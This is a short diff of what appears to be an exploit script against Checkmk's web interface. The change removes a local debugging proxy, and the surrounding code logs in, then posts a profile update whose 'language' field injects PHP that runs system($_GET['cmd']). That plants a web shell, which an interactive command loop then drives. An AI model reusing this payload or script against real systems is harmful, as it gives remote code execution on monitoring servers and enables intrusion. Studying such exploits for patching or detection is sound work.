@@ -111,11 +111,6 @@ def recreate_auth_secret(target, cookie):
 
 def get_shell(target):
 
-  proxy_servers = { 
-    "http":"http://127.0.0.1:8080",
-    "https":"http://127.0.0.1:8080"
-  }
-
   data = f'filled_in=login&_login=1&_origtarget=index.py&_username={username}&_password={password}&_login=Login'
   form_header = { "Content-Type" : "application/x-www-form-urlencoded" }
 
@@ -139,7 +134,7 @@ def get_shell(target):
   else:
     payload = f"""csrf_token={csrf_token}&filled_in=profile&_transid={transid}&language=pwn\\'));%0asystem($_GET["cmd"]);%0a?>&ua_disable_notifications_p_timerange_0_year=2023&ua_disable_notifications_p_timerange_0_month=1&ua_disable_notifications_p_timerange_0_day=24&ua_disable_notifications_p_timerange_0_hour=21&ua_disable_notifications_p_timerange_0_min=0&ua_disable_notifications_p_timerange_0_sec=43&ua_disable_notifications_p_timerange_1_year=2023&ua_disable_notifications_p_timerange_1_month=1&ua_disable_notifications_p_timerange_1_day=24&ua_disable_notifications_p_timerange_1_hour=21&ua_disable_notifications_p_timerange_1_min=0&ua_disable_notifications_p_timerange_1_sec=43&ua_start_url_use=0&ua_start_url_1=dashboard.py&ua_ui_theme_use=0&ua_ui_theme_1=087a83c5ab8d7dd7c80e8c32473ee48b2102a1d055b5dbd02cdd216b15109d2b&ua_ui_sidebar_position=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_nav_hide_icons_title=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_icons_per_item=dc937b59892604f5a86ac96936cd7ff09e25f18ae6b758e8014a24c7fa039e91&ua_show_mode_use=0&ua_show_mode_1=31e3f7a7a194b443c16d007491d4e65e5fd0bcf329f357abde852bf9ad170f8d&_save=SET"""
 
-  s.post(f'http://{target}/{site}/check_mk/user_profile.py', data=payload, proxies=proxy_servers, headers=form_header, verify=False)
+  s.post(f'http://{target}/{site}/check_mk/user_profile.py', data=payload, headers=form_header, verify=False)
 
   while 1:
     cmd = input(">> ")
